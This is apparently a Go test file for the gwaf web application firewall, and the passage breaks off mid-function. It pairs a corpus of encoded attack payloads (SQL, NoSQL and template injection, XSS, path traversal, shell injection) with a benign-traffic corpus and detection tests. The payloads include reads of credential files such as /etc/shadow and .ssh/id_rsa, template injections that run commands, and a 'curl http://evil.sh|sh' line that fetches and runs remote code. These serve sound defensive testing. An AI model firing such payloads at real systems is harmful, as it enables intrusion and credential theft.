// Copyright (c) 2026 Gembit Soultan Shirazi <gembit.soultan@gmail.com>. All rights reserved.

package gwaf_test

// The evasion corpus.
//
// Every payload here is a technique that has been used against real firewalls.
// The point is not that gwaf blocks obvious attacks — the point is that it
// blocks the *encoded* forms of them, because a matcher that only sees literal
// bytes is defeated by an attacker who spends ten seconds URL-encoding.
//
// The corpus is paired with an equally large benign corpus, and both are
// reported together. A detector that catches everything by blocking everything
// passes any recall-only suite, which is why detection rate on its own is never
// a passing metric here (CLAUDE.md §4).
//
// Provenance for the interpretation classes:
//
//   - UTF-7: CVE-2026-21876 (CVSS 9.3, Jan 2026) broke CRS across ModSecurity
//     v2, v3, and Coraza with exactly this.
//   - Double encoding, overlong UTF-8, NUL truncation, backslash separators:
//     long-standing techniques, all still effective against single-decoding
//     firewalls.

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"fmt"
	"slices"
	"strings"
	"testing"

	"github.com/gsoultan/gwaf"
	"github.com/gsoultan/gwaf/rules"
	"github.com/gsoultan/gwaf/rules/op"
	"github.com/gsoultan/gwaf/types"
)

// evasion is one attack payload with the technique it uses.
type evasion struct {
	name      string
	technique string
	arg       string // sent as a query argument
	target    string // sent as the request target instead, when set
	header    [2]string
	body      string
}

// ---- the corpus ------------------------------------------------------------

var evasions = []evasion{
	// ---- baseline: unencoded, must obviously be caught ----------------------
	{name: "sqli/plain union", technique: "none", arg: "1 UNION SELECT password FROM users"},
	{name: "sqli/plain tautology", technique: "none", arg: "1' OR 1=1--"},
	{name: "xss/plain script", technique: "none", arg: "<script>alert(1)</script>"},
	{name: "traversal/plain", technique: "none", target: "/f?p=../../etc/passwd"},
	{name: "rce/plain", technique: "none", arg: "x; cat /etc/passwd"},

	// ---- case variation ----------------------------------------------------
	{name: "sqli/upper", technique: "case", arg: "1 union select password from users"},
	{name: "sqli/mixed", technique: "case", arg: "1 UnIoN SeLeCt password FROM users"},
	{name: "xss/upper tag", technique: "case", arg: "<SCRIPT>alert(1)</SCRIPT>"},
	{name: "xss/mixed tag", technique: "case", arg: "<ScRiPt>alert(1)</ScRiPt>"},

	// ---- whitespace splitting ----------------------------------------------
	{name: "sqli/extra spaces", technique: "whitespace", arg: "1 UNION     SELECT pw"},
	{name: "sqli/tab split", technique: "whitespace", arg: "1 UNION\tSELECT pw"},
	{name: "sqli/newline split", technique: "whitespace", arg: "1 UNION\nSELECT pw"},
	{name: "sqli/crlf split", technique: "whitespace", arg: "1 UNION\r\nSELECT pw"},
	{name: "sqli/vertical tab", technique: "whitespace", arg: "1 UNION\vSELECT pw"},
	{name: "sqli/formfeed", technique: "whitespace", arg: "1 UNION\fSELECT pw"},
	{name: "sqli/spaced tautology", technique: "whitespace", arg: "1'  OR  1 = 1 --"},

	// ---- single percent-encoding -------------------------------------------
	{name: "sqli/encoded union", technique: "urlencode",
		arg: "1 %55%4e%49%4f%4e %53%45%4c%45%43%54 pw"},
	{name: "sqli/encoded space", technique: "urlencode", arg: "1%20UNION%20SELECT%20pw"},
	{name: "xss/encoded tag", technique: "urlencode", arg: "%3Cscript%3Ealert(1)%3C/script%3E"},
	{name: "xss/encoded uppercase hex", technique: "urlencode", arg: "%3CSCRIPT%3Ealert(1)"},
	{name: "traversal/encoded slash", technique: "urlencode", target: "/f?p=..%2f..%2fetc%2fpasswd"},
	{name: "traversal/encoded dots", technique: "urlencode", target: "/f?p=%2e%2e%2f%2e%2e%2fetc%2fpasswd"},
	{name: "rce/encoded semicolon", technique: "urlencode", arg: "x%3B%20cat%20%2Fetc%2Fpasswd"},
	{name: "lfi/encoded passwd", technique: "urlencode", arg: "%2Fetc%2Fpasswd"},

	// ---- plus-as-space (form encoding) -------------------------------------
	{name: "sqli/plus space", technique: "plus", arg: "1+UNION+SELECT+pw"},
	{name: "xss/plus space", technique: "plus", arg: "%3Cscript%3Ealert+(1)"},

	// ---- double encoding ---------------------------------------------------
	// The proxy decodes once, the origin decodes again; a single-decoding
	// firewall sees neither the encoded nor the final form.
	{name: "traversal/double encoded", technique: "double-encode",
		target: "/f?p=%252e%252e%252f%252e%252e%252fetc%252fpasswd"},
	{name: "traversal/double encoded slash", technique: "double-encode",
		target: "/f?p=..%252f..%252fetc%252fpasswd"},
	{name: "xss/double encoded tag", technique: "double-encode",
		arg: "%253Cscript%253Ealert(1)"},
	{name: "lfi/double encoded passwd", technique: "double-encode",
		arg: "%252Fetc%252Fpasswd"},
	{name: "sqli/double encoded quote", technique: "double-encode",
		arg: "1%2527 OR 1=1--"},

	// ---- overlong UTF-8 ----------------------------------------------------
	// Illegal encodings that permissive decoders still resolve to ASCII. This
	// is the family behind the historic IIS Unicode traversal bugs.
	{name: "traversal/overlong dot 2byte", technique: "overlong-utf8",
		target: "/f?p=%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"},
	{name: "traversal/overlong slash", technique: "overlong-utf8",
		target: "/f?p=..%c0%af..%c0%afetc%c0%afpasswd"},
	{name: "traversal/overlong 3byte", technique: "overlong-utf8",
		target: "/f?p=%e0%80%ae%e0%80%ae/etc/passwd"},
	{name: "xss/overlong lt", technique: "overlong-utf8",
		arg: "%c0%bcscript%c0%bealert(1)"},

	// ---- NUL truncation ----------------------------------------------------
	// The origin's C-backed handler stops at the NUL; the firewall inspected
	// the whole string and saw a harmless suffix.
	{name: "lfi/null truncated", technique: "null-truncate",
		arg: "/etc/passwd%00.jpg"},
	{name: "lfi/null truncated png", technique: "null-truncate",
		arg: "/etc/passwd%00.png"},
	{name: "traversal/null truncated", technique: "null-truncate",
		target: "/f?p=../../etc/passwd%00.html"},
	{name: "xss/null truncated", technique: "null-truncate",
		arg: "<script>alert(1)</script>%00.txt"},

	// ---- backslash separators ----------------------------------------------
	// Windows, .NET, and several Java stacks accept these as path separators.
	{name: "traversal/backslash", technique: "separator",
		target: `/f?p=..\..\windows\system32`},
	{name: "traversal/encoded backslash", technique: "separator",
		target: "/f?p=..%5c..%5cwindows%5csystem32"},
	{name: "traversal/mixed separators", technique: "separator",
		target: `/f?p=..\../etc/passwd`},

	// ---- UTF-7 (CVE-2026-21876) --------------------------------------------
	// Inert bytes to a matcher; "<script>" to anything that decodes UTF-7.
	{name: "xss/utf7 script tag", technique: "utf7",
		arg: "+ADw-script+AD4-alert(1)+ADw-/script+AD4-"},
	{name: "xss/utf7 lt only", technique: "utf7",
		arg: "+ADw-script+AD4-"},
	{name: "xss/utf7 img onerror", technique: "utf7",
		arg: "+ADw-img src=x onerror=alert(1)+AD4-"},

	// ---- HTML entities -----------------------------------------------------
	{name: "xss/entity named", technique: "html-entity",
		arg: "&lt;script&gt;alert(1)&lt;/script&gt;"},
	{name: "xss/entity decimal", technique: "html-entity",
		arg: "&#60;script&#62;alert(1)"},
	{name: "xss/entity hex", technique: "html-entity",
		arg: "&#x3c;script&#x3e;alert(1)"},
	{name: "xss/entity no semicolon", technique: "html-entity",
		arg: "&#60script&#62alert(1)"},

	// ---- combined techniques -----------------------------------------------
	// Layering is what real payloads do.
	{name: "sqli/encoded + case + whitespace", technique: "combined",
		arg: "1%20%55nIoN%09%53eLeCt%20pw"},
	{name: "traversal/double encoded + backslash", technique: "combined",
		target: "/f?p=..%255c..%255cwindows%255csystem32"},
	{name: "xss/entity + case", technique: "combined",
		arg: "&#60;ScRiPt&#62;alert(1)"},
	{name: "lfi/overlong + null", technique: "combined",
		arg: "%c0%ae%c0%ae/etc/passwd%00.jpg"},
	{name: "traversal/encoded + null + backslash", technique: "combined",
		target: `/f?p=..%5c..%5cetc%5cpasswd%00.txt`},

	// ---- header-borne payloads ---------------------------------------------
	// Injection through headers is routine; a firewall inspecting only
	// arguments misses it entirely.
	{name: "sqli/in referer", technique: "header",
		header: [2]string{"Referer", "http://x/?id=1 UNION SELECT pw"}},
	{name: "xss/in x-forwarded-for", technique: "header",
		header: [2]string{"X-Forwarded-For", "<script>alert(1)</script>"}},
	{name: "sqli/encoded in cookie header", technique: "header",
		header: [2]string{"Cookie", "sid=1%20UNION%20SELECT%20pw"}},
	{name: "scanner/sqlmap ua", technique: "header",
		header: [2]string{"User-Agent", "sqlmap/1.7.2#stable (http://sqlmap.org)"}},
	{name: "scanner/nikto ua", technique: "header",
		header: [2]string{"User-Agent", "Mozilla/5.00 (Nikto/2.1.6)"}},
	{name: "scanner/mixed case ua", technique: "header",
		header: [2]string{"User-Agent", "SQLMap/1.7"}},

	// ---- body-borne payloads -----------------------------------------------
	{name: "sqli/json body", technique: "body",
		body: `{"query":"1 UNION SELECT password FROM users"}`},
	{name: "xss/json body", technique: "body",
		body: `{"comment":"<script>alert(1)</script>"}`},
	{name: "sqli/form body", technique: "body",
		body: "id=1+UNION+SELECT+pw&submit=go"},
	{name: "xss/encoded in body", technique: "body",
		body: "c=%3Cscript%3Ealert(1)%3C/script%3E"},
	{name: "sqli/double encoded body", technique: "body",
		body: "id=1%2527%20OR%201%3D1--"},

	// ---- PHP and shell wrappers --------------------------------------------
	{name: "lfi/php filter", technique: "wrapper",
		arg: "php://filter/read=convert.base64-encode/resource=index.php"},
	{name: "lfi/php input", technique: "wrapper", arg: "php://input"},
	{name: "lfi/expect", technique: "wrapper", arg: "expect://ls"},
	{name: "lfi/encoded php filter", technique: "wrapper",
		arg: "php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode"},
	{name: "rce/bin sh", technique: "wrapper", arg: "/bin/sh -c id"},
	{name: "rce/encoded bin sh", technique: "wrapper", arg: "%2Fbin%2Fsh%20-c%20id"},

	// ---- sensitive file access ---------------------------------------------
	{name: "lfi/ssh key", technique: "sensitive", arg: "../../../home/user/.ssh/id_rsa"},
	{name: "lfi/aws creds", technique: "sensitive", arg: "../../.aws/credentials"},
	{name: "lfi/proc environ", technique: "sensitive", arg: "/proc/self/environ"},
	{name: "lfi/shadow", technique: "sensitive", arg: "/etc/shadow"},
	{name: "lfi/encoded ssh key", technique: "sensitive", arg: "..%2f..%2f.ssh%2fid_rsa"},

	// ---- NoSQL injection ---------------------------------------------------
	//
	// The payload is a *key*, not a value. Nothing dangerous appears anywhere
	// in {"password":{"$ne":null}}, which is why a value-scanning detector
	// finds nothing and why these cases exist as their own class.
	{name: "nosqli/ne body", technique: "none",
		body: `{"username":"alice","password":{"$ne":null}}`},
	{name: "nosqli/gt body", technique: "none", body: `{"password":{"$gt":""}}`},
	{name: "nosqli/regex body", technique: "none", body: `{"password":{"$regex":"^a"}}`},
	{name: "nosqli/nested", technique: "none",
		body: `{"user":{"profile":{"email":{"$regex":".*"}}}}`},
	{name: "nosqli/or array", technique: "none", body: `{"$or":[{"a":1},{"b":2}]}`},
	{name: "nosqli/where eval", technique: "none",
		body: `{"$where":"this.password.length > 0"}`},
	{name: "nosqli/function eval", technique: "none",
		body: `{"a":{"$function":{"body":"function(){return 1}","args":[]}}}`},
	// Express, PHP, and Rails expand bracket notation into a nested object
	// before the database sees it, so the same attack arrives without JSON.
	{name: "nosqli/bracket", technique: "none", target: "/f?password[$ne]=1"},
	{name: "nosqli/bracket nested", technique: "none", target: "/f?filter[age][$gte]=0"},
	{name: "nosqli/bracket encoded", technique: "single-encode",
		target: "/f?password[%24ne]=1"},
	{name: "nosqli/bracket double encoded", technique: "double-encode",
		target: "/f?password[%2524ne]=1"},
	{name: "nosqli/where bracket", technique: "none", target: "/f?a[$where]=1"},

	// ---- server-side template injection ------------------------------------
	//
	// Template injection is remote code execution, and the delimiters alone are
	// not the attack: "{{ user.name }}" is ordinary Vue, Angular, Handlebars,
	// and Jinja. What makes these payloads is what sits *inside* the braces.
	{name: "ssti/jinja class traversal", technique: "none",
		arg: "{{''.__class__.__mro__[1].__subclasses__()}}"},
	{name: "ssti/jinja globals", technique: "none",
		arg: "{{request.application.__globals__}}"},
	{name: "ssti/jinja config", technique: "none", arg: "{{config.items()}}"},
	{name: "ssti/jinja builtins", technique: "none",
		arg: "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}"},
	{name: "ssti/spring runtime", technique: "none",
		arg: `${T(java.lang.Runtime).getRuntime().exec("id")}`},
	{name: "ssti/spring processbuilder", technique: "none",
		arg: `${T(java.lang.ProcessBuilder)}`},
	{name: "ssti/ruby erb backtick", technique: "none", arg: "<%= `id` %>"},
	{name: "ssti/ruby erb system", technique: "none", arg: "<%= system('id') %>"},
	{name: "ssti/ruby interp", technique: "none", arg: `#{IO.popen("id").read}`},
	{name: "ssti/freemarker exec", technique: "none",
		arg: `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}`},
	{name: "ssti/velocity runtime", technique: "none",
		arg: "#set($x=$rt.getRuntime().exec('id'))"},
	{name: "ssti/encoded jinja", technique: "single-encode",
		arg: "%7B%7Bconfig.items()%7D%7D"},
	{name: "ssti/double encoded jinja", technique: "double-encode",
		arg: "%257B%257Bconfig.items()%257D%257D"},
	{name: "ssti/body", technique: "none",
		body: `{"template":"{{''.__class__.__mro__[1].__subclasses__()}}"}`},

	// ---- shell injection beyond literal command names ----------------------
	//
	// Each of these executes and each defeats a list of command names, which is
	// the whole argument for reading shell structure instead.
	{name: "shelli/glob obfuscation", technique: "shell-expansion",
		arg: "x; /???/c?t /etc/p?sswd"},
	{name: "shelli/base64 pipe", technique: "shell-expansion",
		arg: "x; echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh"},
	{name: "shelli/or chain fetch", technique: "shell-expansion",
		arg: "x || curl http://evil.sh|sh"},
	{name: "shelli/substring expansion", technique: "shell-expansion",
		arg: "x; ${PATH:0:1}etc${PATH:0:1}passwd"},
	{name: "shelli/ifs separator", technique: "shell-expansion",
		arg: "x; cat$IFS/etc/passwd"},
	{name: "shelli/braced ifs", technique: "shell-expansion",
		arg: "x; cat${IFS}/etc/passwd"},
	{name: "shelli/brace expansion", technique: "shell-expansion",
		arg: "x;{cat,/etc/passwd}"},
	{name: "shelli/variable assembly", technique: "shell-expansion",
		arg: "x; a=c;b=at;$a$b /etc/passwd"},
	{name: "shelli/ansi c quoting", technique: "shell-expansion",
		arg: `x; $'\x63\x61\x74' /etc/passwd`},
	// A bare "`id`" is deliberately not reported -- it is also how Markdown
	// writes inline code, and blocking it makes the firewall an obstacle to
	// whoever documents the system. An actual invocation is a different thing.
	{name: "shelli/backtick", technique: "shell-expansion", arg: "x`cat /etc/passwd`"},
	{name: "shelli/command substitution", technique: "shell-expansion", arg: "x$(id)"},
	{name: "shelli/quote splitting", technique: "shell-expansion",
		arg: `x; c'a't /etc/passwd`},
	{name: "shelli/backslash splitting", technique: "shell-expansion",
		arg: `x; c\at /etc/passwd`},
	{name: "shelli/nested substitution", technique: "shell-expansion",
		arg: "x; $(echo $(id))"},
	{name: "shelli/encoded semicolon", technique: "single-encode",
		arg: "x%3B%20cat%20%2Fetc%2Fpasswd"},
	{name: "shelli/body", technique: "none", body: `{"host":"1.1.1.1; cat /etc/passwd"}`},
}

// ---- the benign corpus -----------------------------------------------------
//
// Traffic that must not be blocked. It deliberately includes input that looks
// like an attack to a naive matcher: prose containing SQL keywords, legitimate
// encoding, file names with dots, base64, and markup a user typed on purpose.

type benignCase struct {
	name   string
	arg    string
	target string
	header [2]string
	body   string
}

var benignTraffic = []benignCase{
	// ---- ordinary requests -------------------------------------------------
	{name: "root", target: "/"},
	{name: "rest path", target: "/api/v1/orders/12345"},
	{name: "nested rest", target: "/api/v2/users/42/orders/99/items"},
	{name: "static asset", target: "/assets/app.min.v2.js"},
	{name: "versioned asset", target: "/static/vendor-1.2.3.bundle.css"},
	{name: "trailing slash", target: "/docs/getting-started/"},
	{name: "health check", target: "/healthz"},

	// ---- search and prose --------------------------------------------------
	{name: "plain search", arg: "golang web application framework"},
	{name: "search with apostrophe", arg: "it's a great product"},
	{name: "possessive", arg: "the user's account settings"},
	{name: "sql word: select", arg: "please select a delivery option"},
	{name: "sql word: union", arg: "credit union membership application"},
	{name: "sql word: drop", arg: "drop off location near me"},
	{name: "sql word: insert", arg: "insert the card and wait"},
	{name: "sql word: update", arg: "update my mailing address"},
	{name: "sql word: delete", arg: "delete my account permanently"},
	{name: "sql phrase in prose", arg: "we should select a new union representative"},
	{name: "or in prose", arg: "coffee or tea, either is fine"},
	{name: "equals in prose", arg: "the total = 42 dollars"},
	{name: "script word in prose", arg: "the shooting script was rewritten"},
	{name: "quoted phrase", arg: `he said "that's the one" and left`},
	{name: "math expression", arg: "1 + 1 = 2"},
	{name: "comparison", arg: "price < 100 and rating > 4"},

	// ---- legitimate encoding -----------------------------------------------
	{name: "encoded space", arg: "hello%20world"},
	{name: "encoded email", arg: "user%40example.com"},
	{name: "encoded ampersand", arg: "research%20%26%20development"},
	{name: "plus as space", arg: "hello+world+again"},
	{name: "encoded query in redirect", arg: "/dashboard%3Ftab%3Dsettings"},
	{name: "percent in text", arg: "50% off today"},
	{name: "percent sign encoded", arg: "50%25 off today"},

	// ---- identifiers and tokens --------------------------------------------
	{name: "uuid", arg: "550e8400-e29b-41d4-a716-446655440000"},
	{name: "iso timestamp", arg: "2026-08-05T07:38:00Z"},
	{name: "jwt-like token", arg: "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abc-_123"},
	{name: "base64 payload", arg: "SGVsbG8gV29ybGQhIFRoaXMgaXMgYmFzZTY0Lg=="},
	{name: "hex hash", arg: "d41d8cd98f00b204e9800998ecf8427e"},
	{name: "semver", arg: "1.2.3-beta.4+build.567"},
	{name: "content hash path", target: "/static/app.a1b2c3d4e5f6.js"},

	// ---- relative links (contain dots, must not trip traversal) ------------
	{name: "relative link", arg: "/dashboard/settings"},
	{name: "filename with dots", arg: "report.2026.final.pdf"},
	{name: "dotfile name", arg: ".gitignore"},
	{name: "double extension", arg: "archive.tar.gz"},
	{name: "path with single dot", target: "/api/./v1/status"},

	// ---- markup a user typed on purpose ------------------------------------
	{name: "html in comment body", body: `{"comment":"use the <b>bold</b> tag"}`},
	{name: "code sample in body", body: `{"snippet":"if (a < b) { return; }"}`},
	{name: "markdown body", body: `{"md":"# Title\n\nSome *emphasis* and a [link](/x)."}`},
	{name: "entity in prose", body: `{"c":"AT&T and Johnson &amp; Johnson"}`},
	{name: "ampersand in name", arg: "Smith & Sons Ltd"},

	// ---- realistic API bodies ----------------------------------------------
	{name: "json order", body: `{"name":"Alice","qty":3,"note":"deliver before 5pm"}`},
	{name: "json nested", body: `{"user":{"id":1,"prefs":{"theme":"dark","lang":"en"}}}`},
	{name: "json array", body: `{"ids":[1,2,3,4,5],"action":"archive"}`},
	{name: "form body", body: "email=user%40example.com&subject=Hello+there&msg=Thanks"},
	{name: "json with url", body: `{"callback":"https://example.com/hook?id=42&t=1"}`},
	{name: "json with unicode", body: `{"name":"José García","city":"München"}`},

	// ---- ordinary headers ---------------------------------------------------
	{name: "chrome ua", header: [2]string{"User-Agent",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}},
	{name: "safari ua", header: [2]string{"User-Agent",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"}},
	{name: "curl ua", header: [2]string{"User-Agent", "curl/8.4.0"}},
	{name: "go client ua", header: [2]string{"User-Agent", "Go-http-client/2.0"}},
	{name: "googlebot ua", header: [2]string{"User-Agent",
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}},
	{name: "accept header", header: [2]string{"Accept",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,*/*;q=0.8"}},
	{name: "accept language", header: [2]string{"Accept-Language", "en-GB,en;q=0.9,fr;q=0.8"}},
	{name: "referer", header: [2]string{"Referer", "https://example.com/search?q=widgets"}},
	{name: "auth bearer", header: [2]string{"Authorization",
		"Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.sig"}},
	{name: "content type json", header: [2]string{"Content-Type", "application/json; charset=utf-8"}},
	{name: "content type multipart", header: [2]string{"Content-Type",
		"multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"}},
	{name: "cache control", header: [2]string{"Cache-Control", "max-age=0, must-revalidate"}},
	{name: "traceparent", header: [2]string{"Traceparent",
		"00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01"}},

	// ---- unicode and international ----------------------------------------
	{name: "accented text", arg: "café résumé naïve"},
	{name: "cjk text", arg: "日本語のテキスト"},
	{name: "cyrillic text", arg: "Привет мир"},
	{name: "emoji", arg: "great product 👍🎉"},
	{name: "rtl text", arg: "مرحبا بالعالم"},
	{name: "encoded utf8", arg: "caf%C3%A9%20r%C3%A9sum%C3%A9"},

	// ---- template syntax people write on purpose ---------------------------
	//
	// This is the counterweight that decides whether SSTI detection is usable.
	// Braces are not an attack: they are Vue, Angular, Handlebars, Jinja,
	// Liquid, i18n placeholders, CI config, and shell prose. A detector that
	// keys on the delimiters blocks every CMS, every documentation tool, and
	// every issue tracker someone pastes a workflow into.
	{name: "vue interpolation", arg: "{{ user.name }}"},
	{name: "angular binding", arg: "{{ item.price | currency }}"},
	{name: "handlebars each", arg: "{{#each items}}{{this.title}}{{/each}}"},
	{name: "jinja loop in docs", arg: "{% for row in rows %}{{ row.id }}{% endfor %}"},
	{name: "i18n placeholder", arg: "{{count}} items remaining"},
	{name: "i18n named", arg: "Hello {{name}}, you have {{n}} messages"},
	{name: "liquid template", arg: "{{ product.title | upcase }}"},
	{name: "github actions matrix", arg: "${{ matrix.os }}"},
	{name: "github actions secret", arg: "${{ secrets.GITHUB_TOKEN }}"},
	{name: "shell variable prose", arg: "set ${HOME} before running"},
	{name: "shell param expansion doc", arg: "use ${VAR:-default} for a fallback"},
	{name: "makefile variable", arg: "$(CC) -o $@ $<"},
	{name: "ruby interpolation doc", arg: `puts "hello #{name}"`},
	{name: "erb in a tutorial", arg: "<%= link_to 'Home', root_path %>"},
	{name: "grafana datasource", arg: "${datasource}"},
	{name: "terraform interpolation", arg: "${var.region}"},
	{name: "docker compose var", arg: "${POSTGRES_PASSWORD}"},
	{name: "sprintf format", arg: "Total: %d items (%s)"},
	{name: "json body with template", body: `{"subject":"Welcome {{first_name}}!"}`},

	// ---- $-prefixed keys that are ordinary ---------------------------------
	//
	// The NoSQL counterweight. JSON Schema, JSON reference, and OData all use
	// them, and OData in particular is a published standard with a large
	// installed base.
	{name: "json schema doc", body: `{"$schema":"https://json-schema.org/draft/2020-12/schema","$id":"o"}`},
	{name: "json schema ref", body: `{"properties":{"o":{"$ref":"#/$defs/Order"}}}`},
	{name: "json schema defs", body: `{"$defs":{"Order":{"type":"object"}},"$comment":"v2"}`},
	{name: "dotnet typed json", body: `{"$type":"MyApp.Order, MyApp","total":42}`},
	{name: "dotnet reference", body: `{"$id":"1","$values":[1,2,3]}`},
	{name: "odata filter", target: "/Products?$filter=Price gt 20"},
	{name: "odata select top", target: "/Products?$select=Name&$top=10&$skip=20"},
	{name: "odata orderby", target: "/Orders?$orderby=Created desc&$count=true"},
	{name: "odata search", target: "/Products?$search=blue"},
	{name: "odata expand", target: "/Orders?$expand=Items($select=Sku)"},
	{name: "prose about operators", arg: "use $ne to negate the comparison"},
	{name: "prose about where", body: `{"note":"the $where clause runs javascript"}`},
	{name: "price with dollar", arg: "$19.99"},
	{name: "shell prose dollar", arg: "run $PATH through echo"},

	// ---- shell-shaped text that is not a command ---------------------------
	{name: "semicolon in prose", arg: "first; second; third"},
	{name: "pipe in prose", arg: "a | b | c"},
	{name: "ampersand in prose", arg: "Smith & Sons Ltd"},
	{name: "path in prose", arg: "the config lives in /etc/nginx/nginx.conf"},
	{name: "backtick code fence", arg: "use the `id` field to reference it"},
	{name: "jquery selector", arg: "$('#main').addClass('active')"},
	{name: "regex with dollar", arg: "^[a-z]+$"},
	{name: "cron expression", arg: "0 */6 * * *"},
	{name: "glob in prose", arg: "match *.log files in the directory"},
}

// sortedKeys returns a map's keys in order, so a report reads the same twice.
func sortedKeys[V any](m map[string]V) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	slices.Sort(out)
	return out
}

// TestContentTypeIsNotTrusted covers a bypass that was live and invisible.
//
// Content-Type is attacker-controlled, and the ordinary Go idiom
// json.NewDecoder(r.Body).Decode(&v) never reads it. gwaf did: a JSON body
// labelled text/plain was never parsed, so object keys were never inspected and
// {"password":{"$ne":null}} passed. Value-position payloads still matched
// against the raw body, which is precisely why nothing failed — the corpus had
// no key-position attack in it until NoSQL detection arrived.
func TestContentTypeIsNotTrusted(t *testing.T) {
	w := newWAF(t)

	// Key-position: only visible once the document is parsed.
	const keyAttack = `{"username":"alice","password":{"$ne":null}}`
	// Value-position: visible either way, and the control for this test.
	const valueAttack = `{"q":"1 UNION SELECT password FROM users"}`

	for _, ct := range []string{
		"application/json",
		"application/json; charset=utf-8",
		"application/vnd.api+json",
		"text/plain",
		"application/octet-stream",
		"application/x-www-form-urlencoded",
		"", // no Content-Type at all
	} {
		t.Run("ct="+ct, func(t *testing.T) {
			for _, payload := range []string{keyAttack, valueAttack} {
				h := map[string]string{}
				if ct != "" {
					h["Content-Type"] = ct
				}
				d := run(t, w, req{method: "POST", body: payload, headers: h})
				if !d.Blocked() {
					t.Errorf("NOT BLOCKED with Content-Type %q: %s", ct, payload)
				}
			}
		})
	}
}

// TestSniffingDoesNotBreakFormBodies is the counterweight: preferring the JSON
// reading must not cost the form reading.
func TestSniffingDoesNotBreakFormBodies(t *testing.T) {
	w := newWAF(t)

	d := run(t, w, req{method: "POST",
		headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"},
		body:    "q=1+UNION+SELECT+password+FROM+users&page=2"})
	if !d.Blocked() {
		t.Error("form body no longer inspected")
	}

	d = run(t, w, req{method: "POST",
		headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"},
		body:    "name=alice&city=Bandung&note=hello+world"})
	if d.Blocked() {
		t.Errorf("benign form body blocked: rule=%d", d.RuleID())
	}
}

// ---- coverage by attack class ----------------------------------------------

// declaredClasses are the attack classes gwaf claims to detect, each with the
// minimum number of corpus cases that claim has to be backed by.
//
// This list exists because the corpus was organised by *technique* alone, and a
// technique-only corpus cannot see a missing attack class. Seventeen encoding
// techniques applied to SQL injection and cross-site scripting reported 76/76 —
// a perfect score that measured canonicalization, not coverage. Template
// injection, NoSQL injection, and LDAP injection each scored 0/0, and 0/0 does
// not appear in a percentage.
//
// So a class named here with too few cases fails the build. The failure is the
// point: it is the difference between a gap that is visible in CI and a gap
// that has to be found by probing the firewall by hand.
var declaredClasses = map[string]int{
	"sqli":      8,
	"xss":       8,
	"traversal": 5,
	"lfi":       5,
	"rce":       3,
	"nosqli":    8,
	"ssti":      8,
	"shelli":    8,
	"scanner":   1,
}

// classOf returns the attack class a case belongs to, taken from its name.
func classOf(name string) string {
	if i := strings.IndexByte(name, '/'); i >= 0 {
		return name[:i]
	}
	return name
}

// TestEveryDeclaredClassIsCovered fails when a class gwaf claims to detect has
// no corpus behind the claim.
func TestEveryDeclaredClassIsCovered(t *testing.T) {
	count := map[string]int{}
	for _, e := range evasions {
		count[classOf(e.name)]++
	}

	for class, min := range declaredClasses {
		if got := count[class]; got < min {
			t.Errorf("attack class %q has %d corpus cases, want at least %d: "+
				"an unmeasured class reports as neither caught nor missed",
				class, got, min)
		}
	}
	for class := range count {
		if _, declared := declaredClasses[class]; !declared {
			t.Errorf("corpus class %q is not in declaredClasses, so its "+
				"coverage is never checked", class)
		}
	}
}

// ---- the tests -------------------------------------------------------------

func runEvasion(t *testing.T, w *gwaf.WAF, e evasion) gwaf.Decision {
	t.Helper()

	tx := w.NewTransaction()
	defer tx.Close()

	target := e.target
	if target == "" {
		target = "/search"
	}
	method := "GET"
	if e.body != "" {
		method = "POST"
	}

	tx.SetRequestLine(method, target, "HTTP/1.1")
	tx.SetRemoteAddr("192.0.2.1")
	// A JSON body is declared as such, so the case exercises the parsed-field
	// path rather than only whole-body inspection. Bodies sent with a *wrong*
	// content type are covered separately, by TestContentTypeIsNotTrusted.
	if e.body != "" && e.header[0] == "" {
		tx.AddRequestHeader("Content-Type", "application/json")
	}
	if e.header[0] != "" {
		tx.AddRequestHeader(e.header[0], e.header[1])
	}
	if e.arg != "" {
		tx.AddArgument("q", e.arg)
	}
	// The query string is not re-added here: SetRequestLine parses the request
	// target itself, so doing it again would duplicate every argument.

	if d := tx.ProcessRequestHeaders(); d.Blocked() {
		return d
	}
	if e.body != "" {
		tx.SetRequestBody([]byte(e.body))
	}
	return tx.ProcessRequestBody()
}

func runBenign(t *testing.T, w *gwaf.WAF, b benignCase) gwaf.Decision {
	t.Helper()

	tx := w.NewTransaction()
	defer tx.Close()

	target := b.target
	if target == "" {
		target = "/search"
	}
	method := "GET"
	if b.body != "" {
		method = "POST"
	}

	tx.SetRequestLine(method, target, "HTTP/1.1")
	tx.SetRemoteAddr("192.0.2.1")
	if b.body != "" && b.header[0] == "" {
		tx.AddRequestHeader("Content-Type", "application/json")
	}
	if b.header[0] != "" {
		tx.AddRequestHeader(b.header[0], b.header[1])
	}
	if b.arg != "" {
		tx.AddArgument("q", b.arg)
	}

	if d := tx.ProcessRequestHeaders(); d.Blocked() {
		return d
	}
	if b.body != "" {
		tx.SetRequestBody([]byte(b.body))
	}
	return tx.ProcessRequestBody()
}

// TestEvasionCorpus reports the detection rate per technique. It is the primary
// security metric, and it is reported alongside the false-positive rate from
// TestBenignCorpus because neither number means anything alone.
func TestEvasionCorpus(t *testing.T) {
	w := newWAF(t)

	byTechnique := map[string]struct{ caught, total int }{}
	byClass := map[string]struct{ caught, total int }{}
	var missed []string

	for _, e := range evasions {
		t.Run(e.name, func(t *testing.T) {
			d := runEvasion(t, w, e)

			s := byTechnique[e.technique]
